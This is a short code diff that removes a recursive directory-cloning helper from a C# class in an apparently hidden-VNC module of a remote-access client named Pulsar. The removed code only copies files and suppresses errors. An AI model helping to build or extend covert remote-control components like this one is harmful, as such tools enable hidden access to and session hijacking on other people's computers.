@@ -47,41 +47,6 @@ namespace Pulsar.Client.Helper.HVNC
             public string Destination { get; }
         }
 
-        private void CloneDirectory(string sourceDir, string destinationDir)
-        {
-            if (!Directory.Exists(sourceDir))
-            {
-                throw new DirectoryNotFoundException($"Source directory '{sourceDir}' not found.");
-            }
-
-            Directory.CreateDirectory(destinationDir);
-
-            var directories = Directory.GetDirectories(sourceDir, "*", SearchOption.AllDirectories);
-            var files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);
-
-            foreach (var dir in directories)
-            {
-                try
-                {
-                    string targetDir = dir.Replace(sourceDir, destinationDir);
-                    Directory.CreateDirectory(targetDir);
-                }
-                catch (Exception) { }
-            }
-
-            foreach (var file in files)
-            {
-                try
-                {
-                    string targetFile = file.Replace(sourceDir, destinationDir);
-                    File.Copy(file, targetFile, true);
-                }
-                catch (UnauthorizedAccessException) { }
-                catch (IOException) { }
-                catch (Exception) { }
-            }
-        }
-
         private static bool DeleteFolder(string folderPath)
         {
             bool result;
